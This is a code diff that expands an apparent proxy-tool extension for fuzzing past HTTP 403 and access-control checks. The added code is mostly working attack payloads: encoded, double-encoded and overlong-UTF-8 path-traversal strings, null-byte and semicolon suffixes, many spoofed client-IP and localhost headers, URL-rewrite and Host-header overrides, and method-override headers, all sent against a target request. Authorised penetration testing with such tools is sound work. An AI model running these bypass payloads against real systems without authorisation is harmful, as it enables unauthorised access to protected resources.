@@ -87,43 +87,156 @@ source: |
       queryString = originalPath.substring(qIdx);
   }
 
+  // Advanced path manipulation payloads (inspired by BypassFuzzer)
   String[] pathPayloads = {
+      // Basic path variations
       "/", "//", "/.", "/./", "/..;/", "/.;/", "/%2e/", "/%2e%2e/", "/;/", "/?", "/#",
       ".json", ".html", ".css", ".js", "%00", "%20", "%09", ";.css", ";.js",
-      "/%2e/..", "/%2f", "/..%2f", "/.%2f", "..;/", "/./"
+
+      // Additional file extensions
+      ".php", ".asp", ".aspx", ".jsp", ".txt", ".xml", ".jsonp",
+
+      // Null byte and whitespace injections
+      "%00.json", "%00.php", "%20", "%09", "%0a", "%0d",
+
+      // Encoding variations
+      "/%2f", "/%2F", "/%252f", "/%252F", "/%c0%af", "/%c1%9c",
+
+      // Double encoding
+      "/%252e/", "/%252e%252e/", "/%252e%252e%252f",
+
+      // Unicode variations
+      "/%c0%ae/", "/%c0%ae%c0%ae/", "/%c1%9c/",
+
+      // Path traversal combinations
+      "..%2f", "..%252f", "..%c0%af", "%2e%2e%2f", "%2e%2e%252f",
+
+      // Multiple slashes and encoded slashes
+      "///", "////", "/%2f/", "/%252f/", "/%c0%af/",
+
+      // Query string variations
+      "??", "???", "##",
+
+      // Semicolon variations
+      ";.php", ";.asp", ";.aspx", ";.jsp", ";.css", ";.js", ";.txt"
   };
 
   logging.logToOutput("\n[*] Testing Path Manipulation (Suffixes/Injections)...");
   for (String payload : pathPayloads) {
       sendAndLog.accept("Path Suffix: " + payload, request.withPath(pathOnly + payload + queryString));
-      
+
       if (pathOnly.startsWith("/")) {
           sendAndLog.accept("Path Prefix: " + payload, request.withPath(payload + pathOnly + queryString));
+      }
+  }
+
+  // --- Case Variations ---
+  logging.logToOutput("\n[*] Testing Case Variations...");
+  if (pathOnly.length() > 1) {
+      // Try uppercase
+      String upperPath = pathOnly.toUpperCase();
+      sendAndLog.accept("Case: UPPER", request.withPath(upperPath + queryString));
+
+      // Try lowercase
+      String lowerPath = pathOnly.toLowerCase();
+      sendAndLog.accept("Case: lower", request.withPath(lowerPath + queryString));
+
+      // Try mixed case (first char upper, rest lower)
+      if (pathOnly.length() > 1) {
+          String mixedPath = pathOnly.substring(0, 1).toUpperCase() + pathOnly.substring(1).toLowerCase();
+          sendAndLog.accept("Case: Mixed", request.withPath(mixedPath + queryString));
+      }
+
+      // Try alternating case if path has multiple segments
+      if (pathOnly.contains("/")) {
+          String[] segments = pathOnly.split("/");
+          StringBuilder altCase = new StringBuilder();
+          for (int i = 0; i < segments.length; i++) {
+              String segment = segments[i];
+              if (segment.length() > 0) {
+                  // Alternate case for each segment
+                  String altSegment = (i % 2 == 0) ? segment.toUpperCase() : segment.toLowerCase();
+                  altCase.append(altSegment);
+              }
+              if (i < segments.length - 1) {
+                  altCase.append("/");
+              }
+          }
+          sendAndLog.accept("Case: Alternating", request.withPath(altCase.toString() + queryString));
       }
   }
 
   // --- 3. Header Manipulation ---
   logging.logToOutput("\n[*] Testing Bypass Headers...");
 
+  // Comprehensive IP headers from nomore403
   String[] ipHeaders = {
       "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Port",
-      "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Client-IP", "X-Host", 
+      "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Client-IP", "X-Host",
       "X-Custom-IP-Authorization", "Client-IP", "True-Client-IP", "Forwarded",
-      "CF-Connecting-IP", "X-Originating-IP"
+      "CF-Connecting-IP", "CF-Connecting_IP", "X-Originating-IP",
+      // Additional headers from nomore403
+      "Access-Control-Allow-Origin", "Destination", "Forwarded-For", "Forwarded-For-Ip",
+      "Origin", "Profile", "Proxy", "Real-Ip", "X-Arbitrary", "X-Forward", "X-Forward-For",
+      "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For-Original", "X-Forwarded-Server",
+      "X-Forwarder-For", "X-Original-Remote-Addr", "X-Originally-Forwarded-For",
+      "X-ProxyUser-Ip", "X-Real-Ip", "X-WAP-Profile", "X-True-IP"
   };
 
-  String[] ipValues = {"127.0.0.1", "localhost", "::1", "127.1"};
+  String[] ipValues = {"127.0.0.1", "localhost", "::1", "127.1", "0.0.0.0"};
 
   for (String header : ipHeaders) {
       for (String val : ipValues) {
-          sendAndLog.accept("Header: " + header + "=" + val, request.withAddedHeader(header, val));
+          sendAndLog.accept("IP Header: " + header + "=" + val, request.withAddedHeader(header, val));
       }
   }
 
-  String[] urlHeaders = {"X-Original-URL", "X-Rewrite-URL", "X-Rewrite-Path"};
+  // Comprehensive URL/Path headers from nomore403
+  String[] urlHeaders = {
+      "X-Original-URL", "X-Rewrite-URL", "X-Rewrite-Path",
+      // Additional headers from nomore403
+      "Request-Uri", "Uri", "Url", "Base-Url", "Http-Url", "Proxy-Url", "Redirect",
+      "Referer", "Referrer", "X-HTTP-DestinationURL", "X-Proxy-Url", "Location"
+  };
+
+  String[] urlValues = {pathOnly, "/", "http://127.0.0.1" + pathOnly, "http://localhost" + pathOnly};
+
   for (String header : urlHeaders) {
-      sendAndLog.accept("URL Header: " + header + "=" + pathOnly, request.withAddedHeader(header, pathOnly));
-      sendAndLog.accept("URL Header: " + header + "=/", request.withAddedHeader(header, "/"));
+      for (String val : urlValues) {
+          sendAndLog.accept("URL Header: " + header + "=" + val, request.withAddedHeader(header, val));
+      }
+  }
+
+  // Host headers from nomore403
+  String[] hostHeaders = {
+      "Host", "X-Forwarded-Host", "X-Host", "Proxy-Host", "X-HTTP-Host-Override"
+  };
+
+  String[] hostValues = {"127.0.0.1", "localhost", "127.0.0.1:80", "localhost:80"};
+
+  for (String header : hostHeaders) {
+      for (String val : hostValues) {
+          sendAndLog.accept("Host Header: " + header + "=" + val, request.withAddedHeader(header, val));
+      }
+  }
+
+  // --- 4. HTTP Method Override Headers ---
+  logging.logToOutput("\n[*] Testing HTTP Method Override Headers...");
+
+  String[] methodOverrideHeaders = {
+      "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override", "X-Method"
+  };
+
+  String[] methodOverrideValues = {
+      "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT", "TRACE"
+  };
+
+  for (String header : methodOverrideHeaders) {
+      for (String method : methodOverrideValues) {
+          if (!method.equals(originalMethod)) {
+              sendAndLog.accept("Method Override: " + header + "=" + method, request.withAddedHeader(header, method));
+          }
+      }
   }
 
   logging.logToOutput("\n--- Fuzzing Complete ---");
